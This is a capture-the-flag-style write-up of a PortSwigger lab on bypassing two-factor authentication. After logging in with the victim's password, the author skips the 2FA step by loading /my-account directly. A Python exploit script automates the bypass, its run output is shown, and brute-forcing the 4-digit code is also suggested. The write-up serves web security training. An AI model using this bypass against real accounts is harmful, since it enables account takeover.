This lab's two-factor authentication can be bypassed. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. To solve the lab, access Carlos's account page.

- Your credentials: `wiener:peter`
- Victim's credentials `carlos:montoya`

---

**Goal:** Bypass 2FA and access Carlo's account page.

**Analysis:** From reading the previous information i can guess that i will be able to just click a page on the website after entering the password, but before entering the 2FA, and that will take me straight to the logged in pages, bypassing the 2FA completely. 

For practice, and since this is quite easy, i might as well make a python script utilizing the requests module. 

If you're exploring the app for the first time, go ahead and enter the provided credentials for wiener, then use the email client at the top of the page to get your 2FA, enter it, and now you will be logged in as wiener. 

After sending the 2FA you will get another login request in burp which you can explore with repeater. You will notice that it's only 4 digits which means we could easily bruteforce this with OWASPZap.

Now if we logout, and log in with the Carlos's credentials, we will try to skip the 2FA by dropping the second request (login2) instead of hitting forward, then going straight to the my-account page in the url. `https:web-server/my-account`

![[Pasted image 20240824083309.png]]

![[Pasted image 20240824083426.png]]

**Script:** 
- Make sure to remove `/` from the end of the web server url, or the exploit will not work.

```python
#!/usr/bin/python3

import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def access_carlos_account(s, url):

    # Log into Carlos's account
    print("(+) Logging into Carlos's account, and bypassing 2FA...")
    login_url = url + "/login"
    login_data = {"username": "carlos", "password": "montoya"}
    r = s.post(login_url, data=login_data, allow_redirects=False, verify=False, proxies=proxies)

    # Confirm bypass
    myaccount_url = url + "/my-account"
    r = s.get(myaccount_url, verify=False, proxies=proxies)
    if "Log out" in r.text:
        print("(+) Successfully bypassed 2FA verification.")
    else:
        print("(-) Exploit failed.")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    s = requests.Session()
    url = sys.argv[1]
    access_carlos_account(s, url)

if __name__ == "__main__":
    main()
```

```php
┌──(kali㉿kali)-[~/Documents/portswigger/auth/lab5]
└─$ python3 2fa.py https://0a4000d704899092809326ea00a6000a.web-security-academy.net 
(+) Logging into Carloss account, and bypassing 2FA...
(+) Successfully bypassed 2FA verification.
```



